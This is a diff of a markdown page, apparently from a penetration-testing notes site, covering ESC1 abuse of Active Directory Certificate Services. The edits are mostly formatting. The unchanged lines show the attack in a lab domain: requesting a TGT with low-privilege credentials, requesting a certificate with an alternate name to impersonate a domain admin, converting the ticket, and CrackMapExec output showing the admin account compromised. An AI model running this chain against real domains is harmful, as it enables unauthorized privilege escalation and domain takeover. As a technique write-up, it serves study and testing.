@@ -1,12 +1,12 @@
 ---
-title : "ESC1"
+title: "ESC1"
 # pre : ' '
-description : "ESC1 - Abuse Active Directory Certificate Services."
-date : 2022-01-20T09:05:59+01:00
+description: "ESC1 - Abuse Active Directory Certificate Services."
+date: 2022-01-20T09:05:59+01:00
 # hidden : true
 # draft : true
-weight : 10
-tags : ['Techniques', 'Active Directory', 'ADCS']
+weight: 10
+tags: ["Techniques", "Active Directory", "ADCS"]
 ---
 
 ---
@@ -101,7 +101,7 @@ Permissions
 ### Getting TGT ticket
 
 ```plain
-getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234' 
+getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234'
 ```
 
 Make the ticket available for the current session.
@@ -119,6 +119,8 @@ Parameters:
 - `-n` - 'no-pass' for use with `-k`
 - `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
 - `--template` - the vulnerable template name
+
+To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).
 
 ```plain
 $ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
@@ -230,7 +232,7 @@ d-----         1/19/2022   6:25 AM                Windows
 
 ### Convert .kirbi to .ccache
 
-Use [ticket_converter]({{< ref "ticket-converter" >}}).
+Use [ticketConverter.py]({{< ref "ticketconverter" >}}).
 
 ```plain
 python3 ticket_converter.py johnDomainAdmin.kirbi johnDomainAdmin.ccache
@@ -246,7 +248,7 @@ export KRB5CCNAME=admin.ccache
 ### CrackMapExec
 
 ```plain
-$ cme smb DC01PKI.offsec.nl --use-kcache         
+$ cme smb DC01PKI.offsec.nl --use-kcache
 SMB         DC01PKI.offsec.nl 445    DC01PKI         [*] Windows Server 2019 Standard 17763 x64 (name:DC01PKI) (domain:offsec.nl) (signing:True) (SMBv1:True)
 SMB         DC01PKI.offsec.nl 445    DC01PKI         [+] offsec.nl\johnDomainAdmin (Pwn3d!)
 ```
